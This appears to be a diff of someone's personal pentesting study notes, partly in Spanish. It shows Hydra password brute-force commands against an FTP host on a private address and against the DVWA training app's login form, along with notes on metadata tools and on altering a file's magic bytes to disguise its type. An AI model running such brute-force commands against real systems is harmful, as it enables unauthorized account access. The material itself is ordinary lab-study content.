@@ -72,9 +72,7 @@ bypass -->> saltarse el paso de seguridad
     }
 </script>
 
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-
-@@@@@@@@@@@ BASIC HYDRA 
+@@@@@@@@@@@ BASIC HYDRA @@@@@@@@@@@@@@@@@@
 	hydra -L user.txt -P pass.txt 192.168.1.108 ftp
 	hydra -l JhonMilton66 -P pass.txt 192.168.1.108 ftp
 hydra -l admin -P /root/Desktop/wordlists/test.txt dvwa http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username"
@@ -88,3 +86,13 @@ domaintools
 exiftool---> nos permite leer metadatos de un archivo multimedia
 binwalk ---> herramienta para leer informacion desde las imagenes binarias(firmware)
 magic bytes --> cambiar las cabeceras de un archivo para hacerlo pàrecer otro
+
+@@@@@@@@@@@@@@@ PARA BUSCAR HEADERS DE ARCHIVOS @@@@@@@@@@
+buscar esto ----> List of file signatures
+tambien podemos buscar--> numeros magicos
+
+
+
+
+
+
